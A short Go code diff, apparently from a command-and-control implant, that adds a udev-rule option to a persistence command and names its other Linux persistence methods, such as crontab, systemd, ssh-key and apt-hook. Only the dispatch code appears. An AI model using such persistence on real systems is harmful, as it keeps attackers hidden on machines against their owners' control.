@@ -63,10 +63,12 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistRCLocal(args)
 	case "apt-hook", "apt", "dpkg-hook":
 		return persistAPTHook(args)
+	case "udev-rule", "udev":
+		return persistUdevRule(args)
 	case "list":
 		return persistLinuxList()
 	default:
-		return errorf("Unknown method: %s. Use: crontab, systemd, shell-profile, ssh-key, xdg-autostart, motd, rc-local, apt-hook, or list", args.Method)
+		return errorf("Unknown method: %s. Use: crontab, systemd, shell-profile, ssh-key, xdg-autostart, motd, rc-local, apt-hook, udev-rule, or list", args.Method)
 	}
 }
 
